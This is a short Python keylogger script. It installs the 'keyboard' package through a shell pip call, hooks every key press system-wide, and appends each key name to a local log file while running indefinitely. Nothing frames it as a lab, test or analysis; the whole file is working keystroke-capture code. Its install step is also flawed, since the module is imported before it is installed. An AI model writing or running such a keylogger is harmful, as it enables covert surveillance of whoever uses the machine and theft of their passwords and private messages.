import keyboard
import subprocess

def install_prerequisites():
    try:
        command = 'pip install keyboard'
        subprocess.check_call(command, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while installing prerequisites: {e}")

def on_key_press(event):
    try:
        with open('log_file.txt', 'a') as f:
            f.write('{}\n'.format(event.name))
    except Exception as e:
        print(f"An error occurred while writing to the log file: {e}")

def main():
    # Install the prerequisites
    install_prerequisites()

    # Set up the keyboard event listener
    keyboard.on_press(on_key_press)

    # Wait indefinitely for keyboard events
    keyboard.wait()

if __name__ == "__main__":
    main()


